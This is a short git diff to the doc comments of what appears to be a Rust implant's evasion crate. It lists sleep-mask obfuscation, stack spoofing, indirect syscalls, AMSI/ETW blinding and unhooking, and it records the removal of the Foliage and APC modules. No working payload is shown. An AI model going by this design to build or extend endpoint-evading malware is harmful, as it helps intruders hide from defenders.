@@ -22,7 +22,7 @@
 //!   ├─ SyscallProvider    indirect syscalls / SSN  (foundation; see nyx_evasion)
 //!   ├─ PdataGapScanner    .pdata gap/ghost enum    (foundation for spoof + sleepmask)
 //!   ├─ StackSpoofKit      BYOUD-Gap / LACUNA       (per sensitive call)
-//!   ├─ SleepmaskKit       Ekko / Foliage / InsomniacUnwinding (mask→sleep→unmask)
+//!   ├─ SleepmaskKit       Fluctuation (shipped) / Ekko / InsomniacUnwinding (mask→sleep→unmask)
 //!   ├─ MemoryMaskKit      encrypt + RW↔RX flip / Memory-Bouncing (beats FluctuationMonitor)
 //!   ├─ BlindKit           AMSI / ETW userland blind (byte-patch / HW-BP patchless / forge)
 //!   ├─ UnhookKit          KnownDlls fresh-map / disk fallback
@@ -62,10 +62,6 @@ pub mod gap;
 pub mod frame;
 /// RC4 stream cipher (sleep-mask memory encryption — `SystemFunction032`).
 pub mod rc4;
-/// Foliage sleep-mask 10-step APC→NtContinue chain — pure state-machine model.
-pub mod foliage;
-/// APC / NtContinue chain synthesis — pure model for Foliage/Ekko.
-pub mod apc;
 /// CET-aware RSP-swap decision — pure logic (pessimistic degrade).
 pub mod swap;
 /// Cross-version kernel offset table (Win10 1809 → Win11 25H2 + Server).
@@ -256,14 +252,16 @@ impl SpoofGuard {
     }
 }
 
-/// Sleep obfuscation: own the mask → sleep → unmask window. An Ekko/Foliage
-/// impl's APC timer IS the sleep (do not split mask/unmask around an external
-/// sleep). **Invariant:** on return the image + every thread stack is
+/// Sleep obfuscation: own the mask → sleep → unmask window. An APC-timer-class
+/// impl's (e.g. Ekko) timer IS the sleep (do not split mask/unmask around an
+/// external sleep). **Invariant:** on return the image + every thread stack is
 /// byte-identical to entry.
 ///
-/// Planned impls: `NoMask` (floor), `Ekko`, `Foliage` (SystemFunction032 RC4 +
+/// Planned impls: `NoMask` (floor), `Ekko` (SystemFunction032 RC4 +
 /// WaitForSingleObject), `InsomniacUnwinding` (stomp + register .pdata +
 /// mask memory only — no spoof-during-sleep, CET-clean), `Zilean`, `DreamWalkers`.
+/// (`Foliage` was implemented and deliberately removed — commit 841ffc5 —
+/// superseded by the Fluctuation sleep mask in `implant-evasion`.)
 pub trait SleepmaskKit {
     /// Own the mask → sleep → unmask window. Returns `Err` (e.g.
     /// [`EvasionError::NoFloor`]) when no real sleep-mask impl is wired, so
